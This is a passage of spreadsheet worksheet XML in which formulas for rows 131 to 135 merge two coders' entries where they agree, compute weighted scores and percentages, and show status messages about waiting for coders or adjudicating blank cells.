      <c r="C131" s="11">
        <f>Coder1!C131</f>
        <v/>
      </c>
      <c r="D131" s="11">
        <f>Coder1!D131</f>
        <v/>
      </c>
      <c r="E131" s="14">
        <f>IF(AND(Coder1!E131&amp;""&lt;&gt;"",Coder1!E131&amp;""=Coder2!E131&amp;""),Coder1!E131,"")</f>
        <v/>
      </c>
      <c r="F131" s="14">
        <f>IF(AND(Coder1!F131&amp;""&lt;&gt;"",Coder1!F131&amp;""=Coder2!F131&amp;""),Coder1!F131,"")</f>
        <v/>
      </c>
      <c r="G131" s="14">
        <f>IF(AND(Coder1!G131&amp;""&lt;&gt;"",Coder1!G131&amp;""=Coder2!G131&amp;""),Coder1!G131,"")</f>
        <v/>
      </c>
      <c r="H131" s="14">
        <f>IF(AND(Coder1!H131&amp;""&lt;&gt;"",Coder1!H131&amp;""=Coder2!H131&amp;""),Coder1!H131,"")</f>
        <v/>
      </c>
      <c r="I131" s="14">
        <f>IF(AND(Coder1!I131&amp;""&lt;&gt;"",Coder1!I131&amp;""=Coder2!I131&amp;""),Coder1!I131,"")</f>
        <v/>
      </c>
      <c r="J131" s="14">
        <f>IF(AND(Coder1!J131&amp;""&lt;&gt;"",Coder1!J131&amp;""=Coder2!J131&amp;""),Coder1!J131,"")</f>
        <v/>
      </c>
      <c r="K131" s="14">
        <f>IF(AND(Coder1!K131&amp;""&lt;&gt;"",Coder1!K131&amp;""=Coder2!K131&amp;""),Coder1!K131,"")</f>
        <v/>
      </c>
      <c r="L131" s="14">
        <f>IF(AND(Coder1!L131&amp;""&lt;&gt;"",Coder1!L131&amp;""=Coder2!L131&amp;""),Coder1!L131,"")</f>
        <v/>
      </c>
      <c r="M131" s="14">
        <f>IF(AND(Coder1!M131&amp;""&lt;&gt;"",Coder1!M131&amp;""=Coder2!M131&amp;""),Coder1!M131,"")</f>
        <v/>
      </c>
      <c r="N131" s="14">
        <f>IF(AND(Coder1!N131&amp;""&lt;&gt;"",Coder1!N131&amp;""=Coder2!N131&amp;""),Coder1!N131,"")</f>
        <v/>
      </c>
      <c r="O131" s="14">
        <f>IF(AND(Coder1!O131&amp;""&lt;&gt;"",Coder1!O131&amp;""=Coder2!O131&amp;""),Coder1!O131,"")</f>
        <v/>
      </c>
      <c r="P131" s="14">
        <f>IF(AND(Coder1!P131&amp;""&lt;&gt;"",Coder1!P131&amp;""=Coder2!P131&amp;""),Coder1!P131,"")</f>
        <v/>
      </c>
      <c r="Q131" s="14">
        <f>IF(AND(Coder1!Q131&amp;""&lt;&gt;"",Coder1!Q131&amp;""=Coder2!Q131&amp;""),Coder1!Q131,"")</f>
        <v/>
      </c>
      <c r="R131" s="14">
        <f>IF(AND(Coder1!R131&amp;""&lt;&gt;"",Coder1!R131&amp;""=Coder2!R131&amp;""),Coder1!R131,"")</f>
        <v/>
      </c>
      <c r="S131" s="14">
        <f>IF(AND(Coder1!S131&amp;""&lt;&gt;"",Coder1!S131&amp;""=Coder2!S131&amp;""),Coder1!S131,"")</f>
        <v/>
      </c>
      <c r="T131" s="14">
        <f>IF(AND(Coder1!T131&amp;""&lt;&gt;"",Coder1!T131&amp;""=Coder2!T131&amp;""),Coder1!T131,"")</f>
        <v/>
      </c>
      <c r="U131" s="14">
        <f>IF(AND(Coder1!U131&amp;""&lt;&gt;"",Coder1!U131&amp;""=Coder2!U131&amp;""),Coder1!U131,"")</f>
        <v/>
      </c>
      <c r="V131" s="14">
        <f>IF(AND(Coder1!V131&amp;""&lt;&gt;"",Coder1!V131&amp;""=Coder2!V131&amp;""),Coder1!V131,"")</f>
        <v/>
      </c>
      <c r="W131" s="14">
        <f>IF(AND(Coder1!W131&amp;""&lt;&gt;"",Coder1!W131&amp;""=Coder2!W131&amp;""),Coder1!W131,"")</f>
        <v/>
      </c>
      <c r="X131" s="14">
        <f>IF(AND(Coder1!X131&amp;""&lt;&gt;"",Coder1!X131&amp;""=Coder2!X131&amp;""),Coder1!X131,"")</f>
        <v/>
      </c>
      <c r="Y131" s="14">
        <f>IF(AND(Coder1!Y131&amp;""&lt;&gt;"",Coder1!Y131&amp;""=Coder2!Y131&amp;""),Coder1!Y131,"")</f>
        <v/>
      </c>
      <c r="Z131" s="14">
        <f>IF(AND(Coder1!Z131&amp;""&lt;&gt;"",Coder1!Z131&amp;""=Coder2!Z131&amp;""),Coder1!Z131,"")</f>
        <v/>
      </c>
      <c r="AA131" s="14">
        <f>IF(AND(Coder1!AA131&amp;""&lt;&gt;"",Coder1!AA131&amp;""=Coder2!AA131&amp;""),Coder1!AA131,"")</f>
        <v/>
      </c>
      <c r="AB131" s="14">
        <f>IF(AND(Coder1!AB131&amp;""&lt;&gt;"",Coder1!AB131&amp;""=Coder2!AB131&amp;""),Coder1!AB131,"")</f>
        <v/>
      </c>
      <c r="AC131" s="14">
        <f>IF(AND(Coder1!AC131&amp;""&lt;&gt;"",Coder1!AC131&amp;""=Coder2!AC131&amp;""),Coder1!AC131,"")</f>
        <v/>
      </c>
      <c r="AD131" s="14">
        <f>IF(AND(Coder1!AD131&amp;""&lt;&gt;"",Coder1!AD131&amp;""=Coder2!AD131&amp;""),Coder1!AD131,"")</f>
        <v/>
      </c>
      <c r="AE131" s="14">
        <f>IF(AND(Coder1!AE131&amp;""&lt;&gt;"",Coder1!AE131&amp;""=Coder2!AE131&amp;""),Coder1!AE131,"")</f>
        <v/>
      </c>
      <c r="AF131" s="14">
        <f>IF(AND(Coder1!AF131&amp;""&lt;&gt;"",Coder1!AF131&amp;""=Coder2!AF131&amp;""),Coder1!AF131,"")</f>
        <v/>
      </c>
      <c r="AG131" s="14">
        <f>IF(AND(Coder1!AG131&amp;""&lt;&gt;"",Coder1!AG131&amp;""=Coder2!AG131&amp;""),Coder1!AG131,"")</f>
        <v/>
      </c>
      <c r="AH131" s="14">
        <f>IF(AND(Coder1!AH131&amp;""&lt;&gt;"",Coder1!AH131&amp;""=Coder2!AH131&amp;""),Coder1!AH131,"")</f>
        <v/>
      </c>
      <c r="AI131" s="11">
        <f>IF(COUNT(E131:L131)=0,"",SUM(E131:L131))</f>
        <v/>
      </c>
      <c r="AJ131" s="11">
        <f>IF(AI131="","",N(E131)*3+N(F131)*2+N(G131)*2+N(H131)*2+N(I131)*2+N(J131)*3+N(K131)*3+N(L131)*3)</f>
        <v/>
      </c>
      <c r="AK131" s="11">
        <f>IF(AI131="","",COUNTIF(N131:AG131,1))</f>
        <v/>
      </c>
      <c r="AL131" s="11">
        <f>IF(OR(AJ131="",AJ131=0),"",ROUND(100*(AJ131-AK131)/AJ131,1))</f>
        <v/>
      </c>
      <c r="AM131" s="11">
        <f>IF(AND(Coder1!AN131=1,Coder2!AN131=1),IF(COUNTBLANK(E131:AH131)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN131" s="11">
        <f>IF(AND(Coder1!AN131=1,Coder2!AN131=1),IF(SUMPRODUCT(--(Coder1!E131:AH131&amp;""&lt;&gt;Coder2!E131:AH131&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO131" s="11" t="n"/>
    </row>
    <row r="132">
      <c r="A132" s="11">
        <f>Coder1!A132</f>
        <v/>
      </c>
      <c r="B132" s="11">
        <f>Coder1!B132</f>
        <v/>
      </c>
      <c r="C132" s="11">
        <f>Coder1!C132</f>
        <v/>
      </c>
      <c r="D132" s="11">
        <f>Coder1!D132</f>
        <v/>
      </c>
      <c r="E132" s="14">
        <f>IF(AND(Coder1!E132&amp;""&lt;&gt;"",Coder1!E132&amp;""=Coder2!E132&amp;""),Coder1!E132,"")</f>
        <v/>
      </c>
      <c r="F132" s="14">
        <f>IF(AND(Coder1!F132&amp;""&lt;&gt;"",Coder1!F132&amp;""=Coder2!F132&amp;""),Coder1!F132,"")</f>
        <v/>
      </c>
      <c r="G132" s="14">
        <f>IF(AND(Coder1!G132&amp;""&lt;&gt;"",Coder1!G132&amp;""=Coder2!G132&amp;""),Coder1!G132,"")</f>
        <v/>
      </c>
      <c r="H132" s="14">
        <f>IF(AND(Coder1!H132&amp;""&lt;&gt;"",Coder1!H132&amp;""=Coder2!H132&amp;""),Coder1!H132,"")</f>
        <v/>
      </c>
      <c r="I132" s="14">
        <f>IF(AND(Coder1!I132&amp;""&lt;&gt;"",Coder1!I132&amp;""=Coder2!I132&amp;""),Coder1!I132,"")</f>
        <v/>
      </c>
      <c r="J132" s="14">
        <f>IF(AND(Coder1!J132&amp;""&lt;&gt;"",Coder1!J132&amp;""=Coder2!J132&amp;""),Coder1!J132,"")</f>
        <v/>
      </c>
      <c r="K132" s="14">
        <f>IF(AND(Coder1!K132&amp;""&lt;&gt;"",Coder1!K132&amp;""=Coder2!K132&amp;""),Coder1!K132,"")</f>
        <v/>
      </c>
      <c r="L132" s="14">
        <f>IF(AND(Coder1!L132&amp;""&lt;&gt;"",Coder1!L132&amp;""=Coder2!L132&amp;""),Coder1!L132,"")</f>
        <v/>
      </c>
      <c r="M132" s="14">
        <f>IF(AND(Coder1!M132&amp;""&lt;&gt;"",Coder1!M132&amp;""=Coder2!M132&amp;""),Coder1!M132,"")</f>
        <v/>
      </c>
      <c r="N132" s="14">
        <f>IF(AND(Coder1!N132&amp;""&lt;&gt;"",Coder1!N132&amp;""=Coder2!N132&amp;""),Coder1!N132,"")</f>
        <v/>
      </c>
      <c r="O132" s="14">
        <f>IF(AND(Coder1!O132&amp;""&lt;&gt;"",Coder1!O132&amp;""=Coder2!O132&amp;""),Coder1!O132,"")</f>
        <v/>
      </c>
      <c r="P132" s="14">
        <f>IF(AND(Coder1!P132&amp;""&lt;&gt;"",Coder1!P132&amp;""=Coder2!P132&amp;""),Coder1!P132,"")</f>
        <v/>
      </c>
      <c r="Q132" s="14">
        <f>IF(AND(Coder1!Q132&amp;""&lt;&gt;"",Coder1!Q132&amp;""=Coder2!Q132&amp;""),Coder1!Q132,"")</f>
        <v/>
      </c>
      <c r="R132" s="14">
        <f>IF(AND(Coder1!R132&amp;""&lt;&gt;"",Coder1!R132&amp;""=Coder2!R132&amp;""),Coder1!R132,"")</f>
        <v/>
      </c>
      <c r="S132" s="14">
        <f>IF(AND(Coder1!S132&amp;""&lt;&gt;"",Coder1!S132&amp;""=Coder2!S132&amp;""),Coder1!S132,"")</f>
        <v/>
      </c>
      <c r="T132" s="14">
        <f>IF(AND(Coder1!T132&amp;""&lt;&gt;"",Coder1!T132&amp;""=Coder2!T132&amp;""),Coder1!T132,"")</f>
        <v/>
      </c>
      <c r="U132" s="14">
        <f>IF(AND(Coder1!U132&amp;""&lt;&gt;"",Coder1!U132&amp;""=Coder2!U132&amp;""),Coder1!U132,"")</f>
        <v/>
      </c>
      <c r="V132" s="14">
        <f>IF(AND(Coder1!V132&amp;""&lt;&gt;"",Coder1!V132&amp;""=Coder2!V132&amp;""),Coder1!V132,"")</f>
        <v/>
      </c>
      <c r="W132" s="14">
        <f>IF(AND(Coder1!W132&amp;""&lt;&gt;"",Coder1!W132&amp;""=Coder2!W132&amp;""),Coder1!W132,"")</f>
        <v/>
      </c>
      <c r="X132" s="14">
        <f>IF(AND(Coder1!X132&amp;""&lt;&gt;"",Coder1!X132&amp;""=Coder2!X132&amp;""),Coder1!X132,"")</f>
        <v/>
      </c>
      <c r="Y132" s="14">
        <f>IF(AND(Coder1!Y132&amp;""&lt;&gt;"",Coder1!Y132&amp;""=Coder2!Y132&amp;""),Coder1!Y132,"")</f>
        <v/>
      </c>
      <c r="Z132" s="14">
        <f>IF(AND(Coder1!Z132&amp;""&lt;&gt;"",Coder1!Z132&amp;""=Coder2!Z132&amp;""),Coder1!Z132,"")</f>
        <v/>
      </c>
      <c r="AA132" s="14">
        <f>IF(AND(Coder1!AA132&amp;""&lt;&gt;"",Coder1!AA132&amp;""=Coder2!AA132&amp;""),Coder1!AA132,"")</f>
        <v/>
      </c>
      <c r="AB132" s="14">
        <f>IF(AND(Coder1!AB132&amp;""&lt;&gt;"",Coder1!AB132&amp;""=Coder2!AB132&amp;""),Coder1!AB132,"")</f>
        <v/>
      </c>
      <c r="AC132" s="14">
        <f>IF(AND(Coder1!AC132&amp;""&lt;&gt;"",Coder1!AC132&amp;""=Coder2!AC132&amp;""),Coder1!AC132,"")</f>
        <v/>
      </c>
      <c r="AD132" s="14">
        <f>IF(AND(Coder1!AD132&amp;""&lt;&gt;"",Coder1!AD132&amp;""=Coder2!AD132&amp;""),Coder1!AD132,"")</f>
        <v/>
      </c>
      <c r="AE132" s="14">
        <f>IF(AND(Coder1!AE132&amp;""&lt;&gt;"",Coder1!AE132&amp;""=Coder2!AE132&amp;""),Coder1!AE132,"")</f>
        <v/>
      </c>
      <c r="AF132" s="14">
        <f>IF(AND(Coder1!AF132&amp;""&lt;&gt;"",Coder1!AF132&amp;""=Coder2!AF132&amp;""),Coder1!AF132,"")</f>
        <v/>
      </c>
      <c r="AG132" s="14">
        <f>IF(AND(Coder1!AG132&amp;""&lt;&gt;"",Coder1!AG132&amp;""=Coder2!AG132&amp;""),Coder1!AG132,"")</f>
        <v/>
      </c>
      <c r="AH132" s="14">
        <f>IF(AND(Coder1!AH132&amp;""&lt;&gt;"",Coder1!AH132&amp;""=Coder2!AH132&amp;""),Coder1!AH132,"")</f>
        <v/>
      </c>
      <c r="AI132" s="11">
        <f>IF(COUNT(E132:L132)=0,"",SUM(E132:L132))</f>
        <v/>
      </c>
      <c r="AJ132" s="11">
        <f>IF(AI132="","",N(E132)*3+N(F132)*2+N(G132)*2+N(H132)*2+N(I132)*2+N(J132)*3+N(K132)*3+N(L132)*3)</f>
        <v/>
      </c>
      <c r="AK132" s="11">
        <f>IF(AI132="","",COUNTIF(N132:AG132,1))</f>
        <v/>
      </c>
      <c r="AL132" s="11">
        <f>IF(OR(AJ132="",AJ132=0),"",ROUND(100*(AJ132-AK132)/AJ132,1))</f>
        <v/>
      </c>
      <c r="AM132" s="11">
        <f>IF(AND(Coder1!AN132=1,Coder2!AN132=1),IF(COUNTBLANK(E132:AH132)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN132" s="11">
        <f>IF(AND(Coder1!AN132=1,Coder2!AN132=1),IF(SUMPRODUCT(--(Coder1!E132:AH132&amp;""&lt;&gt;Coder2!E132:AH132&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO132" s="11" t="n"/>
    </row>
    <row r="133">
      <c r="A133" s="11">
        <f>Coder1!A133</f>
        <v/>
      </c>
      <c r="B133" s="11">
        <f>Coder1!B133</f>
        <v/>
      </c>
      <c r="C133" s="11">
        <f>Coder1!C133</f>
        <v/>
      </c>
      <c r="D133" s="11">
        <f>Coder1!D133</f>
        <v/>
      </c>
      <c r="E133" s="14">
        <f>IF(AND(Coder1!E133&amp;""&lt;&gt;"",Coder1!E133&amp;""=Coder2!E133&amp;""),Coder1!E133,"")</f>
        <v/>
      </c>
      <c r="F133" s="14">
        <f>IF(AND(Coder1!F133&amp;""&lt;&gt;"",Coder1!F133&amp;""=Coder2!F133&amp;""),Coder1!F133,"")</f>
        <v/>
      </c>
      <c r="G133" s="14">
        <f>IF(AND(Coder1!G133&amp;""&lt;&gt;"",Coder1!G133&amp;""=Coder2!G133&amp;""),Coder1!G133,"")</f>
        <v/>
      </c>
      <c r="H133" s="14">
        <f>IF(AND(Coder1!H133&amp;""&lt;&gt;"",Coder1!H133&amp;""=Coder2!H133&amp;""),Coder1!H133,"")</f>
        <v/>
      </c>
      <c r="I133" s="14">
        <f>IF(AND(Coder1!I133&amp;""&lt;&gt;"",Coder1!I133&amp;""=Coder2!I133&amp;""),Coder1!I133,"")</f>
        <v/>
      </c>
      <c r="J133" s="14">
        <f>IF(AND(Coder1!J133&amp;""&lt;&gt;"",Coder1!J133&amp;""=Coder2!J133&amp;""),Coder1!J133,"")</f>
        <v/>
      </c>
      <c r="K133" s="14">
        <f>IF(AND(Coder1!K133&amp;""&lt;&gt;"",Coder1!K133&amp;""=Coder2!K133&amp;""),Coder1!K133,"")</f>
        <v/>
      </c>
      <c r="L133" s="14">
        <f>IF(AND(Coder1!L133&amp;""&lt;&gt;"",Coder1!L133&amp;""=Coder2!L133&amp;""),Coder1!L133,"")</f>
        <v/>
      </c>
      <c r="M133" s="14">
        <f>IF(AND(Coder1!M133&amp;""&lt;&gt;"",Coder1!M133&amp;""=Coder2!M133&amp;""),Coder1!M133,"")</f>
        <v/>
      </c>
      <c r="N133" s="14">
        <f>IF(AND(Coder1!N133&amp;""&lt;&gt;"",Coder1!N133&amp;""=Coder2!N133&amp;""),Coder1!N133,"")</f>
        <v/>
      </c>
      <c r="O133" s="14">
        <f>IF(AND(Coder1!O133&amp;""&lt;&gt;"",Coder1!O133&amp;""=Coder2!O133&amp;""),Coder1!O133,"")</f>
        <v/>
      </c>
      <c r="P133" s="14">
        <f>IF(AND(Coder1!P133&amp;""&lt;&gt;"",Coder1!P133&amp;""=Coder2!P133&amp;""),Coder1!P133,"")</f>
        <v/>
      </c>
      <c r="Q133" s="14">
        <f>IF(AND(Coder1!Q133&amp;""&lt;&gt;"",Coder1!Q133&amp;""=Coder2!Q133&amp;""),Coder1!Q133,"")</f>
        <v/>
      </c>
      <c r="R133" s="14">
        <f>IF(AND(Coder1!R133&amp;""&lt;&gt;"",Coder1!R133&amp;""=Coder2!R133&amp;""),Coder1!R133,"")</f>
        <v/>
      </c>
      <c r="S133" s="14">
        <f>IF(AND(Coder1!S133&amp;""&lt;&gt;"",Coder1!S133&amp;""=Coder2!S133&amp;""),Coder1!S133,"")</f>
        <v/>
      </c>
      <c r="T133" s="14">
        <f>IF(AND(Coder1!T133&amp;""&lt;&gt;"",Coder1!T133&amp;""=Coder2!T133&amp;""),Coder1!T133,"")</f>
        <v/>
      </c>
      <c r="U133" s="14">
        <f>IF(AND(Coder1!U133&amp;""&lt;&gt;"",Coder1!U133&amp;""=Coder2!U133&amp;""),Coder1!U133,"")</f>
        <v/>
      </c>
      <c r="V133" s="14">
        <f>IF(AND(Coder1!V133&amp;""&lt;&gt;"",Coder1!V133&amp;""=Coder2!V133&amp;""),Coder1!V133,"")</f>
        <v/>
      </c>
      <c r="W133" s="14">
        <f>IF(AND(Coder1!W133&amp;""&lt;&gt;"",Coder1!W133&amp;""=Coder2!W133&amp;""),Coder1!W133,"")</f>
        <v/>
      </c>
      <c r="X133" s="14">
        <f>IF(AND(Coder1!X133&amp;""&lt;&gt;"",Coder1!X133&amp;""=Coder2!X133&amp;""),Coder1!X133,"")</f>
        <v/>
      </c>
      <c r="Y133" s="14">
        <f>IF(AND(Coder1!Y133&amp;""&lt;&gt;"",Coder1!Y133&amp;""=Coder2!Y133&amp;""),Coder1!Y133,"")</f>
        <v/>
      </c>
      <c r="Z133" s="14">
        <f>IF(AND(Coder1!Z133&amp;""&lt;&gt;"",Coder1!Z133&amp;""=Coder2!Z133&amp;""),Coder1!Z133,"")</f>
        <v/>
      </c>
      <c r="AA133" s="14">
        <f>IF(AND(Coder1!AA133&amp;""&lt;&gt;"",Coder1!AA133&amp;""=Coder2!AA133&amp;""),Coder1!AA133,"")</f>
        <v/>
      </c>
      <c r="AB133" s="14">
        <f>IF(AND(Coder1!AB133&amp;""&lt;&gt;"",Coder1!AB133&amp;""=Coder2!AB133&amp;""),Coder1!AB133,"")</f>
        <v/>
      </c>
      <c r="AC133" s="14">
        <f>IF(AND(Coder1!AC133&amp;""&lt;&gt;"",Coder1!AC133&amp;""=Coder2!AC133&amp;""),Coder1!AC133,"")</f>
        <v/>
      </c>
      <c r="AD133" s="14">
        <f>IF(AND(Coder1!AD133&amp;""&lt;&gt;"",Coder1!AD133&amp;""=Coder2!AD133&amp;""),Coder1!AD133,"")</f>
        <v/>
      </c>
      <c r="AE133" s="14">
        <f>IF(AND(Coder1!AE133&amp;""&lt;&gt;"",Coder1!AE133&amp;""=Coder2!AE133&amp;""),Coder1!AE133,"")</f>
        <v/>
      </c>
      <c r="AF133" s="14">
        <f>IF(AND(Coder1!AF133&amp;""&lt;&gt;"",Coder1!AF133&amp;""=Coder2!AF133&amp;""),Coder1!AF133,"")</f>
        <v/>
      </c>
      <c r="AG133" s="14">
        <f>IF(AND(Coder1!AG133&amp;""&lt;&gt;"",Coder1!AG133&amp;""=Coder2!AG133&amp;""),Coder1!AG133,"")</f>
        <v/>
      </c>
      <c r="AH133" s="14">
        <f>IF(AND(Coder1!AH133&amp;""&lt;&gt;"",Coder1!AH133&amp;""=Coder2!AH133&amp;""),Coder1!AH133,"")</f>
        <v/>
      </c>
      <c r="AI133" s="11">
        <f>IF(COUNT(E133:L133)=0,"",SUM(E133:L133))</f>
        <v/>
      </c>
      <c r="AJ133" s="11">
        <f>IF(AI133="","",N(E133)*3+N(F133)*2+N(G133)*2+N(H133)*2+N(I133)*2+N(J133)*3+N(K133)*3+N(L133)*3)</f>
        <v/>
      </c>
      <c r="AK133" s="11">
        <f>IF(AI133="","",COUNTIF(N133:AG133,1))</f>
        <v/>
      </c>
      <c r="AL133" s="11">
        <f>IF(OR(AJ133="",AJ133=0),"",ROUND(100*(AJ133-AK133)/AJ133,1))</f>
        <v/>
      </c>
      <c r="AM133" s="11">
        <f>IF(AND(Coder1!AN133=1,Coder2!AN133=1),IF(COUNTBLANK(E133:AH133)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN133" s="11">
        <f>IF(AND(Coder1!AN133=1,Coder2!AN133=1),IF(SUMPRODUCT(--(Coder1!E133:AH133&amp;""&lt;&gt;Coder2!E133:AH133&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO133" s="11" t="n"/>
    </row>
    <row r="134">
      <c r="A134" s="11">
        <f>Coder1!A134</f>
        <v/>
      </c>
      <c r="B134" s="11">
        <f>Coder1!B134</f>
        <v/>
      </c>
      <c r="C134" s="11">
        <f>Coder1!C134</f>
        <v/>
      </c>
      <c r="D134" s="11">
        <f>Coder1!D134</f>
        <v/>
      </c>
      <c r="E134" s="14">
        <f>IF(AND(Coder1!E134&amp;""&lt;&gt;"",Coder1!E134&amp;""=Coder2!E134&amp;""),Coder1!E134,"")</f>
        <v/>
      </c>
      <c r="F134" s="14">
        <f>IF(AND(Coder1!F134&amp;""&lt;&gt;"",Coder1!F134&amp;""=Coder2!F134&amp;""),Coder1!F134,"")</f>
        <v/>
      </c>
      <c r="G134" s="14">
        <f>IF(AND(Coder1!G134&amp;""&lt;&gt;"",Coder1!G134&amp;""=Coder2!G134&amp;""),Coder1!G134,"")</f>
        <v/>
      </c>
      <c r="H134" s="14">
        <f>IF(AND(Coder1!H134&amp;""&lt;&gt;"",Coder1!H134&amp;""=Coder2!H134&amp;""),Coder1!H134,"")</f>
        <v/>
      </c>
      <c r="I134" s="14">
        <f>IF(AND(Coder1!I134&amp;""&lt;&gt;"",Coder1!I134&amp;""=Coder2!I134&amp;""),Coder1!I134,"")</f>
        <v/>
      </c>
      <c r="J134" s="14">
        <f>IF(AND(Coder1!J134&amp;""&lt;&gt;"",Coder1!J134&amp;""=Coder2!J134&amp;""),Coder1!J134,"")</f>
        <v/>
      </c>
      <c r="K134" s="14">
        <f>IF(AND(Coder1!K134&amp;""&lt;&gt;"",Coder1!K134&amp;""=Coder2!K134&amp;""),Coder1!K134,"")</f>
        <v/>
      </c>
      <c r="L134" s="14">
        <f>IF(AND(Coder1!L134&amp;""&lt;&gt;"",Coder1!L134&amp;""=Coder2!L134&amp;""),Coder1!L134,"")</f>
        <v/>
      </c>
      <c r="M134" s="14">
        <f>IF(AND(Coder1!M134&amp;""&lt;&gt;"",Coder1!M134&amp;""=Coder2!M134&amp;""),Coder1!M134,"")</f>
        <v/>
      </c>
      <c r="N134" s="14">
        <f>IF(AND(Coder1!N134&amp;""&lt;&gt;"",Coder1!N134&amp;""=Coder2!N134&amp;""),Coder1!N134,"")</f>
        <v/>
      </c>
      <c r="O134" s="14">
        <f>IF(AND(Coder1!O134&amp;""&lt;&gt;"",Coder1!O134&amp;""=Coder2!O134&amp;""),Coder1!O134,"")</f>
        <v/>
      </c>
      <c r="P134" s="14">
        <f>IF(AND(Coder1!P134&amp;""&lt;&gt;"",Coder1!P134&amp;""=Coder2!P134&amp;""),Coder1!P134,"")</f>
        <v/>
      </c>
      <c r="Q134" s="14">
        <f>IF(AND(Coder1!Q134&amp;""&lt;&gt;"",Coder1!Q134&amp;""=Coder2!Q134&amp;""),Coder1!Q134,"")</f>
        <v/>
      </c>
      <c r="R134" s="14">
        <f>IF(AND(Coder1!R134&amp;""&lt;&gt;"",Coder1!R134&amp;""=Coder2!R134&amp;""),Coder1!R134,"")</f>
        <v/>
      </c>
      <c r="S134" s="14">
        <f>IF(AND(Coder1!S134&amp;""&lt;&gt;"",Coder1!S134&amp;""=Coder2!S134&amp;""),Coder1!S134,"")</f>
        <v/>
      </c>
      <c r="T134" s="14">
        <f>IF(AND(Coder1!T134&amp;""&lt;&gt;"",Coder1!T134&amp;""=Coder2!T134&amp;""),Coder1!T134,"")</f>
        <v/>
      </c>
      <c r="U134" s="14">
        <f>IF(AND(Coder1!U134&amp;""&lt;&gt;"",Coder1!U134&amp;""=Coder2!U134&amp;""),Coder1!U134,"")</f>
        <v/>
      </c>
      <c r="V134" s="14">
        <f>IF(AND(Coder1!V134&amp;""&lt;&gt;"",Coder1!V134&amp;""=Coder2!V134&amp;""),Coder1!V134,"")</f>
        <v/>
      </c>
      <c r="W134" s="14">
        <f>IF(AND(Coder1!W134&amp;""&lt;&gt;"",Coder1!W134&amp;""=Coder2!W134&amp;""),Coder1!W134,"")</f>
        <v/>
      </c>
      <c r="X134" s="14">
        <f>IF(AND(Coder1!X134&amp;""&lt;&gt;"",Coder1!X134&amp;""=Coder2!X134&amp;""),Coder1!X134,"")</f>
        <v/>
      </c>
      <c r="Y134" s="14">
        <f>IF(AND(Coder1!Y134&amp;""&lt;&gt;"",Coder1!Y134&amp;""=Coder2!Y134&amp;""),Coder1!Y134,"")</f>
        <v/>
      </c>
      <c r="Z134" s="14">
        <f>IF(AND(Coder1!Z134&amp;""&lt;&gt;"",Coder1!Z134&amp;""=Coder2!Z134&amp;""),Coder1!Z134,"")</f>
        <v/>
      </c>
      <c r="AA134" s="14">
        <f>IF(AND(Coder1!AA134&amp;""&lt;&gt;"",Coder1!AA134&amp;""=Coder2!AA134&amp;""),Coder1!AA134,"")</f>
        <v/>
      </c>
      <c r="AB134" s="14">
        <f>IF(AND(Coder1!AB134&amp;""&lt;&gt;"",Coder1!AB134&amp;""=Coder2!AB134&amp;""),Coder1!AB134,"")</f>
        <v/>
      </c>
      <c r="AC134" s="14">
        <f>IF(AND(Coder1!AC134&amp;""&lt;&gt;"",Coder1!AC134&amp;""=Coder2!AC134&amp;""),Coder1!AC134,"")</f>
        <v/>
      </c>
      <c r="AD134" s="14">
        <f>IF(AND(Coder1!AD134&amp;""&lt;&gt;"",Coder1!AD134&amp;""=Coder2!AD134&amp;""),Coder1!AD134,"")</f>
        <v/>
      </c>
      <c r="AE134" s="14">
        <f>IF(AND(Coder1!AE134&amp;""&lt;&gt;"",Coder1!AE134&amp;""=Coder2!AE134&amp;""),Coder1!AE134,"")</f>
        <v/>
      </c>
      <c r="AF134" s="14">
        <f>IF(AND(Coder1!AF134&amp;""&lt;&gt;"",Coder1!AF134&amp;""=Coder2!AF134&amp;""),Coder1!AF134,"")</f>
        <v/>
      </c>
      <c r="AG134" s="14">
        <f>IF(AND(Coder1!AG134&amp;""&lt;&gt;"",Coder1!AG134&amp;""=Coder2!AG134&amp;""),Coder1!AG134,"")</f>
        <v/>
      </c>
      <c r="AH134" s="14">
        <f>IF(AND(Coder1!AH134&amp;""&lt;&gt;"",Coder1!AH134&amp;""=Coder2!AH134&amp;""),Coder1!AH134,"")</f>
        <v/>
      </c>
      <c r="AI134" s="11">
        <f>IF(COUNT(E134:L134)=0,"",SUM(E134:L134))</f>
        <v/>
      </c>
      <c r="AJ134" s="11">
        <f>IF(AI134="","",N(E134)*3+N(F134)*2+N(G134)*2+N(H134)*2+N(I134)*2+N(J134)*3+N(K134)*3+N(L134)*3)</f>
        <v/>
      </c>
      <c r="AK134" s="11">
        <f>IF(AI134="","",COUNTIF(N134:AG134,1))</f>
        <v/>
      </c>
      <c r="AL134" s="11">
        <f>IF(OR(AJ134="",AJ134=0),"",ROUND(100*(AJ134-AK134)/AJ134,1))</f>
        <v/>
      </c>
      <c r="AM134" s="11">
        <f>IF(AND(Coder1!AN134=1,Coder2!AN134=1),IF(COUNTBLANK(E134:AH134)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN134" s="11">
        <f>IF(AND(Coder1!AN134=1,Coder2!AN134=1),IF(SUMPRODUCT(--(Coder1!E134:AH134&amp;""&lt;&gt;Coder2!E134:AH134&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO134" s="11" t="n"/>
    </row>
    <row r="135">
      <c r="A135" s="11">
        <f>Coder1!A135</f>
        <v/>
      </c>
      <c r="B135" s="11">
        <f>Coder1!B135</f>
        <v/>
      </c>
      <c r="C135" s="11">
        <f>Coder1!C135</f>
        <v/>
      </c>
      <c r="D135" s="11">
        <f>Coder1!D135</f>
        <v/>
      </c>
      <c r="E135" s="14">
        <f>IF(AND(Coder1!E135&amp;""&lt;&gt;"",Coder1!E135&amp;""=Coder2!E135&amp;""),Coder1!E135,"")</f>
        <v/>
      </c>
      <c r="F135" s="14">
        <f>IF(AND(Coder1!F135&amp;""&lt;&gt;"",Coder1!F135&amp;""=Coder2!F135&amp;""),Coder1!F135,"")</f>
        <v/>
      </c>
      <c r="G135" s="14">
